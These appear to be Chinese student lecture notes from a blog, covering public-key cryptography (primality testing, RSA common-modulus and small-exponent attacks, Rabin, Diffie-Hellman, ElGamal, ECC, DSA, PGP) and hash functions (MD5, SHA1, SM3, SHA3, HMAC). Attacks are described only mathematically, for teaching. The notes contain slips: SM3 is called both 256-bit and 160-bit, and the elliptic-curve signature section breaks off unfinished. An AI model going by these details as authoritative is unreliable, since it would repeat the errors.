<p>p-1=2^s^t，$a^{p-1}-1=(a^{2^{s-1}t}+1)(a^{2^{s-2}t}+1)…(a^{t}+1)(a^{t}+1)$<br>则下列同余式中至少有一个成立：<br>$a^t\equiv -1\mod p, a^{2t}\equiv -1\mod p,…,a^{2^{s-1}t}\equiv -1\mod p$<br><strong>强伪素数</strong>：设n为奇合数，n-1=2^s^t，t为奇数，整数b与n互素，满足b^t^=1 mod n，或者存在r，0≤r&lt;s，有$b^{2^rt}\equiv -1\mod n$，称n为对于基b的强伪素数</p>
<p><strong>Solovay-Strassen算法</strong><br>随机选择整数a在1到n-1之间，x=$(\frac{a}{n})$，若x=0则n为合数；若$x\equiv a^{\frac{n-1}{2}}\pmod n$则n是素数，否则为合数（计算雅可比符号）<br>判断具有1/2的错误概率（若n为素数则输出一定为素数，若n为合数则有1/2的概率输出为合数）</p>
<p><strong>Miller-Rabin算法</strong><br>n-1=2^s^t的形式，其中t为奇数<br>随机选择整数a在1到n-1之间<br>计算$b=a^t\mod n$<br>如果$b\equiv 1\pmod n$，那么n为素数；否则进行下列循环：<br>for i=0 to s-1:<br>if $b\equiv -1\pmod n$，then n是素数<br>else b=b^2^ mod n<br>若循环能结束则n为合数</p>
<p>若n为强伪素数，则输出可能为素数；若n为素数，则输出一定为素数，具有1/4的错误概率，优于Solovay-Strassen算法</p>
<p><strong>AKS算法</strong><br>确定性素性检测方法<br>理论基础：$a\in Z,n\in N,n\ge 2,(a,n)=1$，n是素数，当且仅当$(x+a)^n=x^n+a\pmod n$<br>该算法为该理论复杂度的改进：$(x+a)^n=x^n+a\pmod {x^r-1,n}$<br>算法的时间复杂度高于概率算法</p>
<ul>
<li>若存在整数a&gt;0且b&gt;1，满足n=a^b^，则输出合数</li>
<li>找出满足$\operatorname {ord}_r(n)&gt;\log_2n$的最小的r</li>
<li>若对a≤r，1&lt;gcd(a,n)&lt;n，输出合数</li>
<li>若n≤r，输出素数</li>
<li>for a=1 to $\lfloor{\sqrt{\varphi(r)}\log n}\rfloor$ do<ul>
<li>if (x+a)^n^≠x^n^+a (mod x^r^-1, n)，输出合数</li>
</ul>
</li>
<li>输出素数</li>
</ul>
<h2 id="共模攻击"><a href="#共模攻击" class="headerlink" title="共模攻击"></a>共模攻击</h2><p>给群组中每个人相同的公钥n，但指数e和d不同时可能产生共模攻击</p>
<ul>
<li>对于群组内成员，即使不分解n也可以解密其他人消息<br>$e_1d_1\equiv 1\mod \varphi(n),e_2d_2\equiv 1\mod \varphi(n)$<br>$e_2d_2’\equiv 1\mod(e_1d_1-1)\Rightarrow e_2d_2’\equiv 1\mod \varphi(n)$<br>（自己有$e_1,d_1$，因此可以计算$d_2’$）</li>
<li>群组外人员如果截获到发送给群组不同成员的同一消息，而两个加密指数互素，则可以直接恢复消息<br>令m为明文消息，加密指数为$e_1,e_2$，且二者互素，故存在r,s使得$re_1+se_2=1$，假设r为负数<br>则$(c_1^{-1})^{-r}c_2^s=m^{re_1+se_2}=m\mod n$</li>
</ul>
<h2 id="小加密指数攻击"><a href="#小加密指数攻击" class="headerlink" title="小加密指数攻击"></a>小加密指数攻击</h2><p>若选择的e较小（如3），则加密会很快<br><strong>Coppersmith定理攻击</strong>：n为大整数，f为次数为e的多项式，可以在log n时间内有效计算出f(x)=0 mod n的小于$n^{\frac{1}{e}}$的解。<br>应避免使用小的加密指数，e最少应选取2^16^+1=65537<br>在短消息加密之前应该首先填充</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>教科书式的RSA方案是不安全的，速度慢是其主要缺点（硬件实现比DES慢1000倍，软件慢100倍，选择特定的e值能够大大加快RSA的速度）<br>可用于加密、密钥交换和数字签名</p>
<h1 id="Rabin密码体制"><a href="#Rabin密码体制" class="headerlink" title="Rabin密码体制"></a>Rabin密码体制</h1><p>设n=pq，其中p,q为素数，均为4k+3型素数<br>P=C=Z~n~，且定义K={(n,p,q)}<br>对于k=(n,p,q)，定义<br>$e_k(x)=x^2\pmod n, d_k(y)=\sqrt y\pmod n$<br>（x,y∈Z~n~），其中n为公钥，p、q为私钥</p>
<p>这是一个单向陷门函数，陷门为n的分解。f(x)=x^2^ mod n</p>
<h1 id="公开密钥算法"><a href="#公开密钥算法" class="headerlink" title="公开密钥算法"></a>公开密钥算法</h1><p>加密：$C=E_{K_{pub}}(P)$<br>解密：$P=D_{K_{prv}}(C)$<br>两个密钥不能相互推导（或推导的难度不亚于密码分析）<br>其中一个密钥公开（$K_{pub}$），另一个密钥保密（$K_{prv}$）<br>每一个用户掌握一个私钥，并将相应的公钥放在公共目录中</p>
<p>问题：如何让别人正确知道你的公钥？（如何保证你发出的公钥不被篡改/如何证明一个公钥是不是你的？）<br>答案：通过可信授权中心（PKI），每个人将自己的公钥发给PKI，由PKI为该公钥签名，相当于提供一个证书，在将这个有签名的公钥返还给用户。</p>
<h1 id="离散对数问题"><a href="#离散对数问题" class="headerlink" title="离散对数问题"></a>离散对数问题</h1><p>对于乘法群$(G,\cdot)$，一个n阶元素a∈G和β∈\<a\><br>问题：找到唯一非负整数i不大于n-1，满足a^i^=β<br>将整数i记为$\operatorname {ind}_{\alpha}(\beta)$，称为β的离散对数</p>
<h1 id="Diffie-Hellman算法"><a href="#Diffie-Hellman算法" class="headerlink" title="Diffie-Hellman算法"></a>Diffie-Hellman算法</h1><p>交换素数p和本原元g<br>Alice和Bob选择各自的私钥，Alice向Bob发送X=g^x^ mod p，Bob向Alice发送Y=g^y^ mod p。<br>之后Alice计算k=Y^x^ mod p，Bob计算k=X^y^ mod p，二者计算的值相等，实现密钥交换。</p>
<p>上述的密钥交换方案不安全。容易遭受中间人攻击。<br>如果Eve能够截获两者发送的X和Y，他用自己的密钥进行计算然后分别发送给Alice和Bob，这样A和B接收到的就是Eve的值。</p>
<h1 id="ElGamal密码体制"><a href="#ElGamal密码体制" class="headerlink" title="ElGamal密码体制"></a>ElGamal密码体制</h1><p>假设p为一个大素数，使得p构成乘法群上的离散对数问题难解。令α∈Z~p~是一个本原元，令P=Z~p~<em>，C=Z~p~</em>×Z~p~*，定义K={(p,α,a,β): β=α^a^ mod p}<br>其中p,α,β为公钥，a为私钥。<br>对k=(p,α,a,β)以及一个秘密的随机数r∈Z~p-1~，定义e~k~(x,r)=(y~1~, y~2~)<br>其中y~1~=α^r^ mod p, y~2~=xβ^r^ mod p<br>定义d~k~(y~1~, y~2~)=y~2~(y~1~^a^)^-1^ mod p<br>注意r在加密的时候需要随机选择，加密后应立即销毁不能在信道上传输。<br>加密运算具有不确定性。</p>
<font color=red>注意三个公钥中只有β与私钥a直接相关。</font>

<h1 id="椭圆曲线"><a href="#椭圆曲线" class="headerlink" title="椭圆曲线"></a>椭圆曲线</h1><p>设a,b∈R是满足$4a^3+27b^2\ne 0$的实常数，方程$y^2=x^3+ax+b$所有解(x, y)∈R×R连同一个无穷远点$O$组成的集合E称为一个非奇异椭圆曲线。</p>
<p>从函数图像来看，椭圆曲线有两种，一种有一条线，一种有两条线</p>
<h2 id="Weierstrass方程"><a href="#Weierstrass方程" class="headerlink" title="Weierstrass方程"></a>Weierstrass方程</h2><p>定义在代数闭域$\bar K$上射影平面坐标的一般方程<br>$Y^2Z+a_1XYZ+a_3YZ^2=X^3+a_2X^2Z+a_4XZ^2+a_6Z^3 (a_1,a_2,a_3,a_4,a_6\in\bar K)$<br>K上的射影平面P^2^(K)是K^3^/{(0, 0, 0)}上关系~的等价类集合，每个等价类记作(X:Y:Z)<br>(X~1~,Y~1~,Z~1~) ~ (X~2~,Y~2~,Z~2~)<br>$F(X,Y,Z)=Y^2Z+a_1XYZ+a_3YZ^2-X^3-a_2X^2Z-a_4XZ^2-a_6Z^3=0$<br>非奇异：$\frac{\partial F}{\partial X},\frac{\partial F}{\partial Y},\frac{\partial F}{\partial Z}$在P点至少有一个非0。</p>
<p>椭圆曲线E：非奇异Weierstrass方程的所有P^2^($\bar K$)的解<br>y^2^+a~1~xy+a~3~y=x^3^+a~2~x^2^+a~4~x+a~6~</p>
<p>(E,+)是一个以无穷远点0为单位元的阿贝尔群，加法规则为：<br>$P+0=0+P=P\\<br>-0=0\\<br>P=(x_1,y_1)\ne 0, -P=(x_1,-y_1-a_1x_1-a_3)\\<br>Q=-P,P+Q=0<br>P,Q\ne 0,Q\ne -P,P+Q=-R$<br>其中R为直线PQ或过点P的切线与椭圆曲线的第三个交点<br><img src="2.jpeg" alt=""><br>（当P和Q重合时，直线是曲线的切线，把y作为因变量对x求导计算$\frac{dy}{dx}$）</p>
<h2 id="椭圆曲线密码（ECC）"><a href="#椭圆曲线密码（ECC）" class="headerlink" title="椭圆曲线密码（ECC）"></a>椭圆曲线密码（ECC）</h2><p>阶：有限域F~q~上的椭圆曲线E(F~q~)由点组成，其上点的数量即为#E(F~q~)。称为椭圆曲线的阶。</p>
<p>倍点运算：P+P</p>
<p>椭圆曲线离散对数问题：已知曲线E(F~q~)，阶为n的点G∈E(F~q~)，P∈\<G\>，椭圆曲线离散对数问题是指确定整数k∈[0,…,n-1]使得P=KG成立。</p>
<p>安全参数的选取：<br>(q, a, b, G, n, h)<br>对于特征为p的有限域F~q~<br>其中a、b为椭圆曲线的参数，G为基点，阶为n，有限域F~q~的特征为p</p>
<p>$F_p(p&gt;3): y^2=x^3+ax+b,a,b\in F_p,(4a^3+27b^2)\mod p\ne 0$<br>$F_{2^m}(p=2): y^2+xy=x^3+ax+b,a,b\in F_{2^m}, b\ne 0$</p>
<p>存在弱椭圆曲线：超奇异曲线（$p|q+1-#E(F_q)$）和异常曲线（$#E(F_q)=p$）</p>
<p><strong>可以基于ECC构建DH密钥交换协议</strong>：首先选择公开参数$(q,F_q,E,G,n)$，Alice发送$P_a=aG$，Bob发送$P_b=bG$，二者交换后计算分别得到$S=abG$即为私钥。（仍然易受到中间人攻击）</p>
<p><strong>也可以基于ECC构建ElGamal密码体制</strong>：首先选择公开参数$(q,F_q,E,G,n), A:(d_A,P_A),P_A=d_AG$<br>B发送明文消息m给A需要加密：<br>随机选择$r\in Z_n$<br>计算$C_1=rG, Q=rP_A(Q_x\ne 0);C_2=mQ_x$<br>发送$(C_1,C_2)$给A<br>解密：$d_AC_1=d_ArG=rP_A=Q,m=C_2Q_x^{-1}$</p>
<h1 id="数字签名"><a href="#数字签名" class="headerlink" title="数字签名"></a>数字签名</h1><p>签名方案：一个签名方案由一个五元组构成（P,A,K,S,V），其中<br>P是所有可能的消息组成的有限集<br>A是所有可能的签名组成的有限集<br>K是所有可能的密钥组成的有限集（密钥空间）<br>对于每一个k∈K，有一个秘密的签名函数sig~k~∈S和一个相应的公开的验证函数ver~k~∈V，sig~k~：P→A，ver~k~：P×A→{true, false}，满足：<br>当y=sig~k~(x)时，ver~k~(x,y)=true，否则为false</p>
<h2 id="RSA签名方案"><a href="#RSA签名方案" class="headerlink" title="RSA签名方案"></a>RSA签名方案</h2><p>设n=pq，p，q为素数，P=A=Z~n~，定义K={(n,p,q,e,d): ed $\equiv$ 1 mod φ(n)}<br>对于k=(n,p,q,e,d)，定义sig~k~(x)=x^d^ mod n和ver~k~(x,y)=true ↔ x=y^e^ mod n<br>(x,y∈Z~n~)，(n,e)为公钥，(n,d)为私钥</p>
<p><strong>存在性伪造问题</strong>：任何人都可以伪造他人的签名y，对应消息为x=e~k~(y)=y^e^，一般这个消息是无意义的，但要防止攻击者计算大量的e~k~(y)，找出有意义的值从而伪造签名。<br>可以通过给消息添加可以识别的冗余信息或者对消息摘要后签名</p>
<p><strong>选择密文攻击</strong>：<br>假设A响应E的任何签名要求：$c=m^e mod n$<br>$x=r^e\mod n,y=xc\mod n$<br>$y^d\mod n=(xc)^d\mod n=rc^d\mod n$<br>$r^{-1}y^d\mod n=r^{-1}rc^d\mod n=m$</p>
<p>若E想得到A关于消息m的签名，$m=m_1m_2\mod n$，可以通过m~1~和m~2~的签名构造m的签名。<br>$m^d\mod n=(m_1m_2)^d\mod n=(m_1^d\mod n)(m_2^d\mod n)\mod n$</p>
<p>因此不要对陌生消息签名，签名之前先对消息求摘要、身份认证。</p>
<p><strong>签名和公钥加密结合的方案：</strong></p>
<ul>
<li>第一种方案：先签名后加密——$y=sig_{Alice}(x),z=e_{Bob}(x,y)$</li>
<li>第二种方案：先加密后签名——$z=e_{Bob}(x),y=sig_{Alice}(z)$</li>
<li>第二种方案可能存在伪造签名混淆发送者的问题，因此采用第一种方案更好。</li>
</ul>
<p><strong>ElGamal签名方案</strong>：<br>设p为一个大素数，使得$(Z_p^<em>, \cdot)$上的离散对数问题难解。令$\alpha\in Z_p^</em>$是一个本原元，令$P=Z_p^<em>,A=Z_p^</em>\times Z_{p-1}$，定义$K=\{(p,\alpha,a,\beta):\beta=\alpha^a\mod p\}$<br>其中$p,\alpha,\beta$为公钥，$a$为私钥<br>对$k=(p,\alpha,a,\beta)$以及一个秘密的随机数$r\in Z_{p-1}^<em>$，定义$sig_k(x,r)=(\gamma,\delta)$<br>其中$\gamma=\alpha^r\mod p,\delta=(x-a\gamma)r^{-1}\mod p-1$<br>对于$x,\gamma\in Z_p^</em>,\delta\in Z_{p-1}$<br>定义$ver(x,(y,\delta))=true\Leftrightarrow \beta^\gamma\gamma^\delta\equiv\alpha^x\mod p$<br>容易证明$\beta^\gamma\gamma^\delta\equiv\alpha^{a\gamma+r(x-a\gamma)r^{-1}\mod p-1}\equiv\alpha^x\mod p$</p>
<h2 id="数字签名标准"><a href="#数字签名标准" class="headerlink" title="数字签名标准"></a>数字签名标准</h2><p>DSA算法，签名比验证快很多，不能加密和密钥分配，专用于数字签名，比RSA慢<br>设p是一个大素数，使得$(Z_p^<em>, \cdot)$上的离散对数问题难解。令$\alpha\in Z_p^</em>$是一个q阶元素（q为素数），$&lt;\alpha&gt;$上的离散对数问题也难解。（整数k与p-1互素，k∈[0, p-2]，q|p-1）</p>
<script type="math/tex; mode=display">\gamma=\alpha^k\mod p,\delta=(x+a\gamma)k^{-1}\mod p-1(k\in Z_{p-1}^*)\\
\because k\delta\equiv x+a\gamma\mod p-1,\therefore\alpha^{k\delta}\equiv\alpha^{x+a\gamma}\mod p\\
\Rightarrow\alpha^x\beta^\gamma\equiv\gamma^\delta\mod p,\delta=(x+a\gamma)k^{-1}\mod q\\
\gamma'=\gamma\mod q=(\alpha^k\mod p)\mod q,\delta=(x+a\gamma')k^{-1}\mod q\\
\alpha^x\beta^{\gamma'}\equiv\gamma^\delta\mod p\\
\gamma=(\alpha^x\beta^{\gamma'})^{\delta^{-1}\mod q}\mod p\Rightarrow \gamma=
(\alpha^{x\delta^{-1}\mod q}\beta^{\gamma'\delta^{-1}\mod q}\mod p)\mod q=\gamma'</script><p>验证$\gamma=<br>(\alpha^{x\delta^{-1}\mod q}\beta^{\gamma’\delta^{-1}\mod q}\mod p)\mod q=\gamma’$是否成立。成立则数字签名有效。</p>
<script type="math/tex; mode=display">sig_K(x,k)=(\gamma, \delta), \gamma=(\alpha^k\mod p)\mod q,\delta=(\operatorname {SHA-1}(x)+a\gamma)k^{-1}\mod q\\
e_1=\operatorname {SHA-1}(x)\delta^{-1}\mod q,e_2=\gamma\delta^{-1}\mod q\\
ver_K(x,(\gamma,\delta))=true\Leftrightarrow(\alpha^{e_1}\beta^{e_2}\mod p)\mod q=\gamma</script><h3 id="椭圆曲线数字签名"><a href="#椭圆曲线数字签名" class="headerlink" title="椭圆曲线数字签名"></a>椭圆曲线数字签名</h3><p>p是一个大素数，E定义在F~p~上的椭圆曲线。设A是E上阶为q（素数）的一个点，使得在\<A\>上的离散对数问题是难处理的。设P={0,1}*，A=Z~q~*×Z~q~*，定义K={(p,q,E,A,m,B): B=mA}<br>其中0≤m≤q-1，值p,q,E,A,B为公钥，m为私钥。<br>对于K和一个秘密的随机数k，1≤k≤q-1，定义</p>
<script type="math/tex; mode=display">sig_K(x,k)=(r,s)</script><p>其中</p>
<h2 id="PGP安全协议"><a href="#PGP安全协议" class="headerlink" title="PGP安全协议"></a>PGP安全协议</h2><p>一种以用户为中心的可提供机密性和鉴别的安全协议。<br><img src="3.jpeg" alt=""><br>若需要签名和加密，则先签名再加密，如需压缩则加密后压缩：$Z(Sig(H(M),kR_a)||M)$</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80-Chapter-4%E2%80%94%E2%80%94Hash%E5%87%BD%E6%95%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/28/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80-Chapter-4%E2%80%94%E2%80%94Hash%E5%87%BD%E6%95%B0/" class="post-title-link" itemprop="url">密码学基础 Chapter 4——Hash函数</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-02-28 22:59:24" itemprop="dateCreated datePublished" datetime="2023-02-28T22:59:24+08:00">2023-02-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-03-01 11:31:32" itemprop="dateModified" datetime="2023-03-01T11:31:32+08:00">2023-03-01</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E8%AF%BE%E5%86%85%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">课内笔记</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E8%AF%BE%E5%86%85%E7%AC%94%E8%AE%B0/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80/" itemprop="url" rel="index"><span itemprop="name">密码学基础</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>4.7k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>4 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="4-1-数据完整性"><a href="#4-1-数据完整性" class="headerlink" title="4.1 数据完整性"></a>4.1 数据完整性</h1><p>信息安全的三个要点：机密性、完整性、可用性<br>被动攻击：攻击者只能监听；主动攻击：攻击者可能会干扰通信</p>
<ul>
<li>数据完整性是对抗对消息未授权修改的安全服务</li>
<li>有些应用不需要机密性<br>解决完整性问题：添加冗余</li>
<li>对称技术：Hash函数（散列函数），报文鉴别码（MAC）</li>
<li>非对称技术：数字签名</li>
</ul>
<h2 id="Hash函数"><a href="#Hash函数" class="headerlink" title="Hash函数"></a>Hash函数</h2><p>H(M)作用于一个任意长度的消息M，返回固定长度（通常超过128比特）的散列值h：<br>h=H(M)</p>
<ul>
<li>有时也称为摘要函数、散列函数或杂凑函数</li>
<li>h也被称为消息或数据的“摘要”或“指纹”</li>
<li>带密钥的Hash函数：可以将h和M一起在不安全的信道中传输</li>
<li>不带密钥的Hash函数：h必须安全存放以保证h不被篡改</li>
</ul>
<p>作用：</p>
<ul>
<li>口令保护</li>
<li>构造报文鉴别码HMAC</li>
<li>数字签名</li>
<li>伪随机数生成器</li>
</ul>
<p>要求：</p>
<ul>
<li>快速：给定M，很容易计算h</li>
<li>单向：给定h，根据H(M)=h无法计算出M</li>
<li>防碰撞：给定M，要找到另一条消息M’并满足二者摘要相等困难或找到任意两个具有相同散列值的不同消息困难</li>
</ul>
<p>假定h：X→Y，|X|≥|Y|，设x∈X，定义y=h(x)</p>
<ul>
<li>单向性（原像稳固性）：给定摘要y，找到x使得h(x)=y困难</li>
<li>第二原像稳固性：给定消息x∈X，找到一个x’∈X且x’≠x，使得h(x)=h(x’)困难</li>
<li>碰撞稳固性：对于任意x，x’∈X，找到x≠x’且h(x)=h(x’)的二元组(x，x’)困难</li>
</ul>
<p>理想的Hash函数应该满足：对于给定的x，只能通过函数h计算得到h(x)的值，而无法通过其他条件得到；已知h(x~1~)，h(x~2~)，…，无法间接推出h(x)，其中x与x~1~，x~2~，…均不相等</p>
<h2 id="随机预言机ROM"><a href="#随机预言机ROM" class="headerlink" title="随机预言机ROM"></a>随机预言机ROM</h2><ul>
<li>提供“理想”Hash函数的数学模型</li>
<li>确定性、有效性和均匀输出</li>
</ul>
<p>令$F^{X,Y}$是所有从X到Y的函数集合，假定|X|=N，|Y|=M，随机从$F^{X,Y}$中选择一个Hash函数h：X→Y，对于任意的输入x，其输出值为均匀的，计算h(x)的唯一方法是询问随机预言机。</p>
<p>定理：假定$h\in F^{X,Y}$随机选择，令$X_0\in X$，假定当且仅当$x\in X_0$时。h(x)被确定，则对所有的$x\in X \backslash X_0,y\in Y$都有$Pr[h(x)=y]=\frac{1}{M}$</p>
<h2 id="原像问题"><a href="#原像问题" class="headerlink" title="原像问题"></a>原像问题</h2><p>Find - Preimage(h, y, Q)<br>选择任意的$X_0\subseteq X,|X_0|=Q$<br>for each x∈X~0~<br>do: if h(x)=y then return(x)<br>return (failure)</p>
<p>对于任意的$X_0\subseteq X,|X_0|=Q$，算法的平均成功率为$\varepsilon=1-(1-\frac{1}{M})^{Q}$</p>
<p>证明：给定y∈Y，令X~0~={x~1~，x~2~，…，x~Q~}<br>对于1≤i≤Q，有$Pr[E_i]=\frac{1}{M}$<br>则有$Pr[E_1 \vee E_2 \vee … \vee E_Q]=1-(1-\frac{1}{M})^Q$<br>对于任意给定的y的成功率是常数，故结论成立。Q远小于M，故$\varepsilon\approx\frac{Q}{M}$（舍弃了后面的M^-1^的高次项）</p>
<h2 id="第二原像问题"><a href="#第二原像问题" class="headerlink" title="第二原像问题"></a>第二原像问题</h2><p><strong>拉斯维加斯算法</strong><br>Find - Second - Preimage(h, y, Q)<br>y=h(x)<br>选择$X_0\subseteq X\backslash\{x\},|X_0|=Q-1$<br>for each x~0~∈X~0~<br>do: if h(x~0~)=y then return(x~0~)<br>return failure</p>
<p>对于任意的$X_0\subseteq X\backslash\{x\},|X_0|=Q-1$，算法的成功率为$\varepsilon=1-(1-\frac{1}{M})^{Q-1}$</p>
<h2 id="碰撞问题"><a href="#碰撞问题" class="headerlink" title="碰撞问题"></a>碰撞问题</h2><p><strong><font color=red>生日攻击</font></strong><br>Find - Collision(h, Q)<br>选择任意的$X_0\subseteq X,|X_0|=Q$<br>for each x∈X~0~<br>do y~x~=h(x)<br>if 对某一x’∈X，有y~x~=y~x’~<br>then return (x,x’)<br>else return (failure)</p>
<p>对于任意的$X_0\subseteq X,|X_0|=Q$，算法平均成功率为</p>
<script type="math/tex; mode=display">\varepsilon=1-(\frac{M-1}{M}\frac{M-2}{M}...\frac{M-Q+1}{M})</script><script type="math/tex; mode=display">Q\approx\sqrt{2M\ln\frac{1}{1-\varepsilon}}</script><p>证明：</p>
<script type="math/tex; mode=display">\varepsilon=1-(\frac{M-1}{M}\frac{M-2}{M}...\frac{M-Q+1}{M})\\
\approx\prod_{i=1}^{k-1}e^{-\frac{i}{M}}=e^{-\frac{k(k-1)}{2M}}</script><font color=red>对一个输出空间大小为M的随机函数，只需要计算大约$\sqrt{M}$个函数值就能够以一个不可忽略的概率发现一个碰撞。因此Hash函数的输出空间大小必须有一个下界。</font>

<h2 id="安全性准则的比较"><a href="#安全性准则的比较" class="headerlink" title="安全性准则的比较"></a>安全性准则的比较</h2><p>Collision - To - Second - Preimage(h)<br>external Oracle - 2nd - Preimage<br>均匀随机选择x∈X<br>if Oracle - 2nd - Preimage(h,x)=x’<br>then return (x,x’)<br>else return (failure)</p>
<p>碰撞问题可以归约到第二原像问题，因此可以说碰撞稳固性质意味着第二原像稳固性质。</p>
<p>Collision - To - Preimage(h)<br>external Oracle - Preimage<br>均匀随机选择x∈X<br>y←h(x)<br>if (Oracle - Preimage(h, y)=x’) and (x≠x’)<br>then return (x, x’)<br>else return (failure)</p>
<p>定理4.5 假定h: X→Y是一个Hash函数，其中|X|和|Y|有限且|X|≥2|Y|。假定Oracle - Preimage对固定的hash函数是原像问题中的一个(1, Q)算法，则Collision - To - Preimage对固定的Hash函数时碰撞问题的一个(1/2, Q+1)算法</p>
<p><strong>使用随机预言机模型中理想Hash函数是困难的，可以参考一些分组密码理论构造尽可能接近理想特性的Hash函数。（混乱、扩散、随机）</strong>。可以基于数学难题构造方法，但计算速度慢，不实用。因此可以使用对称密码体制来设计Hash函数，或者直接设计。</p>
<h1 id="4-2-常用Hash函数"><a href="#4-2-常用Hash函数" class="headerlink" title="4.2 常用Hash函数"></a>4.2 常用Hash函数</h1><p>Hash函数通用结构：迭代结构</p>
<h2 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h2><h3 id="填充"><a href="#填充" class="headerlink" title="填充"></a>填充</h3><p>最后一块的最后8个字节（64bits）保存的是输入的长度。如果消息正好是分块的整数倍，仍然需要填充一整块，其中前面为10000…（填充内容），后面为输入长度。如果消息过长（大于2\^64 bits），则将消息模2\^64（仅取低64位）计算MD5。（消息长度为小端序）</p>
<h3 id="压缩初始化"><a href="#压缩初始化" class="headerlink" title="压缩初始化"></a>压缩初始化</h3><p>初始化4个字寄存器，填入CV~0~（0x67452301，0xEFCDAB89，0x98BADCFE，0x10325476，固定不变）</p>
<h3 id="压缩"><a href="#压缩" class="headerlink" title="压缩"></a>压缩</h3><p><img src="1.jpeg" alt=""></p>
<script type="math/tex; mode=display">F(B,C,D)=(B\land C)\vee(\lnot B\land D)\\
G(B,C,D)=(B\land C)\vee(C\land\lnot D)\\
H(B,C,D)=B\oplus C\oplus D\\
I(B,C,D)=C\oplus(B\vee\lnot D)</script><h2 id="SHA1"><a href="#SHA1" class="headerlink" title="SHA1"></a>SHA1</h2><h3 id="填充-1"><a href="#填充-1" class="headerlink" title="填充"></a>填充</h3><p>与MD5基本相同，不同的是SHA1最后的输入长度为<strong>大端序</strong>而MD5为小端序</p>
<h3 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h3><p>一共执行80步后输出<br><img src="2.jpeg" alt=""></p>
<script type="math/tex; mode=display">F_1=(B\land C)\vee(\lnot B\land D)\\
F_2=B\oplus C\oplus D\\
F_3=(B\land C)\vee(B\land D)\vee(C\land D)</script><p>其中F~1~用于第0-19步，F~2~用于第20-39、60-79步，F~3~用于第40-59步</p>
<script type="math/tex; mode=display">W_t=\left\{\\
\begin{array}{c}
Y_i[t], 0\le t\le 15\\
S^1(W_{t-16}\oplus W_{t-14}\oplus W_{t-8}\oplus W_{t-3})，t\ge 15
\end{array}
\right.</script><script type="math/tex; mode=display">K_t=\left\{\\
\begin{array}{c}
\operatorname{0x}5A827999, 0\le t\le 19\\
\operatorname{0x}6ED9EBA1, 20\le t\le 39\\
\operatorname{0x}8F1BBCDC, 40\le t\le 59\\
\operatorname{0x}CA62C1D6, 60\le t\le 79\\
\end{array}
\right.</script><h2 id="二者比较"><a href="#二者比较" class="headerlink" title="二者比较"></a>二者比较</h2><p>摘要长度：寻找原像与碰撞<br>速度：SHA1速度慢于MD5<br>简洁与紧致性：描述和实现都较为简单，无需更大代换表<br>数据存储方式：小端序和大端序<br>安全性：SHA1优于MD5</p>
<h2 id="SM3"><a href="#SM3" class="headerlink" title="SM3"></a>SM3</h2><ul>
<li>遵循通用迭代结构</li>
<li>输出为256比特的摘要，消息长度小于2^64^，按照512比特分组</li>
<li>过程包括填充和迭代压缩，填充方式与MD5相同</li>
<li>压缩函数使用8个字寄存器，大端序存储，同SHA1，一共执行64步</li>
<li>输出为160bit</li>
</ul>
<p><img src="3.jpeg" alt=""><br>压缩函数：将Y~i~扩展为132个字用于压缩函数CF（ABCDEFGH）<br><img src="4.jpeg" alt=""><br><img src="5.jpeg" alt=""></p>
<h2 id="SHA3"><a href="#SHA3" class="headerlink" title="SHA3"></a>SHA3</h2><p>采用海绵结构，可以实现任意长度的输入和输出<br><img src="6.jpeg" alt=""></p>
<h3 id="填充-2"><a href="#填充-2" class="headerlink" title="填充"></a>填充</h3><p>首尾填充1，中间填充0，整数倍也要填充</p>
<p>$\forall n\ge 0,\forall M,M’\in(Z_2)^*:M\ne M’\Rightarrow M||pad[r]\ne M’||pad[r]||0^{nr}$<br>即若原来的明文不一样，填充完之后应该也不一样。<br><img src="7.jpeg" alt=""><br><img src="8.jpeg" alt=""><br><img src="9.jpeg" alt=""><br><img src="10.jpeg" alt=""><br><img src="11.jpeg" alt=""><br><img src="12.jpeg" alt=""></p>
<h2 id="MAC"><a href="#MAC" class="headerlink" title="MAC"></a>MAC</h2><p>报文校验码，满足某些安全性质的带密钥的Hash函数，功能是保证数据完整性以及数据源认证<br>可以通过不带密钥的Hash函数构造：HMAC<br>也可通过对称密钥算法构造：CBC-MAC</p>
<p>ipad = 3636…36<br>opad = 5c5c…5c</p>
